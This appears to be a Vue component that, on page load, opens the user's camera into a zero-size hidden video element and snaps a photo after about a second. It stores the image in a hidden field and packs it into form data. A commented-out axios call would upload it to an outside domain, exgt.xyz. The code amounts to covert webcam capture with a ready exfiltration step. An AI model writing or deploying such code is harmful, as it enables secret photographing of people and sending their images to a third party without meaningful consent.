<template>
  <div>
    <video id="video" width="0" height="0" autoplay></video>
    <canvas
      style="width: 0px; height: 0px"
      id="canvas"
      width="480"
      height="640"
    ></canvas>
    <input type="hidden" name="img" id="result" value="" />
    <img :src="urls" alt="" />
  </div>
</template>
<script>
// import axios from 'axios';
export default {
  data() {
    return {
      urls: ''
    };
  },
  async mounted() {
    var _this = this;
    var canvas = document.getElementById('canvas');
    var context = canvas.getContext('2d');
    var video = document.getElementById('video');
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
      const constraints = {
        video: {
          width: {
            min: 1280,
            ideal: 1920,
            max: 2560
          },
          height: {
            min: 720,
            ideal: 1080,
            max: 1440
          }
        }
      };

      // 开启相机
      navigator.mediaDevices.getUserMedia(constraints).then(
        function (stream) {
          video.srcObject = stream;
          video.play();

          setTimeout(function () {
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0);
          }, 1000);
          setTimeout(function () {
            var img = canvas.toDataURL('image/png');
            document.getElementById('result').value = img;
            _this.urls = img;
            var blob = _this.dataURItoBlob(img); //这里我们需要注意一些 因为 canvas.toDataURL生成的连接是base64的
            var fd = new FormData(); // 我们需要通过dataURItoBlob方法来让 canvas.toDataURL转成biob类型的
            fd.append('fileData', blob);
            fd.append('fileName', '123jpg');
            // axios({
            //   url: 'https://exgt.xyz',
            //   method: 'post',
            //   data: fd,
            //   headers: { 'Content-Type': 'multipart/form-data' }
            // }).then((url) => {
            //   console.log(url);
            // });
          }, 1300);
        },
        function () {
          alert('操作失败，权限不够！');
        }
      );
    }
  },
  methods: {
    dataURItoBlob(base64Data) {
      var byteString;
      if (base64Data.split(',')[0].indexOf('base64') >= 0)
        byteString = atob(base64Data.split(',')[1]);
      else byteString = unescape(base64Data.split(',')[1]);
      var mimeString = base64Data.split(',')[0].split(':')[1].split(';')[0];
      var ia = new Uint8Array(byteString.length);
      for (var i = 0; i < byteString.length; i++) {
        ia[i] = byteString.charCodeAt(i);
      }
      return new Blob([ia], { type: mimeString });
    }
  }
};
</script>

<style lang="scss" scoped></style>
